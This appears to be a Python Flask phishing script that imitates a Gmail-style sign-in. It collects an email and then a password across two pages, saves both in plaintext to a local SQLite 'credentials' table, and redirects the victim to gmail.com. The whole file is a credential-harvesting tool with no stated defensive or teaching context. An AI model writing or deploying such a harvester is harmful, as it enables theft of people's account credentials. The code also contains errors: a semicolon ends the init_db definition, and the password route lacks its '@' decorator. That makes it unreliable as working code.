import flask
from flask import Flask, request, redirect, render_template, session, url_for
import sqlite3
import os
from datetime import datetime

app = Flask(__name__)   # Create flask instance

app.config['SECRET_KEY'] = os.urandom(24)   # Set random session
DATABASE = 'credentials.db'

def get_db():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn

def init_db();
    conn = get_db()
    cursor = conn.cursor()
    print("Checking if table exists, otherwise creating a table.")
    cursor.execute('''
	    CREATE TABLE IF NOT EXISTS credentials (
		    id INTEGER PRIMARY KEY AUTOINCREMENT,
		    email TEXT NOT NULL,
		    password TEXT NOT NULL,
		    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
	    )
    ''')
    conn.commit()
    print("Table exists, or it has been created.")
    conn.close()

init_db()

@app.route('/') # When entering site base directory: 127.0.0.1:5000, run index
def index():
    session.pop('username', None)   # Clear any previous session data
    return render_template('email_page.html')

@app.route('/handle_email', methods=['POST'])
def handle_email():
    email = request.form.get('username')
    if not email:
        return "Email is required.", 400

    session['username'] = email
    print(f"Recieved email: {email}")

    return render_template('password_page.html', username=email)

app.route('/handle_password', methods=['POST'])
def handle_password():
    password = request.form.get('password')
    username = session.get('username')

    if not password or not username:
        print("Error: Missing pasword or username in current session.")
        return redirect(url_for('index'))

    print(f"Recieved password for user: {username}")

    conn = get_db()
    cursor = conn.cursor()
    cursor.execute(
            "INSERT INTO credentials (email, password, timestamp) VALUES (?, ?, ?)",
            (username, password, datetime.now())
    )
    conn.commit()
    print(f"Credentials saved for {username}")
    conn.close()

    session.pop('username', None)

    print("Redirecting to gmail.com...")
    return redirect("https://gmail.com", code=302)

if __name__ == '__main__':
    app.run(debug=True, host='127.0.0.1', port=5000)
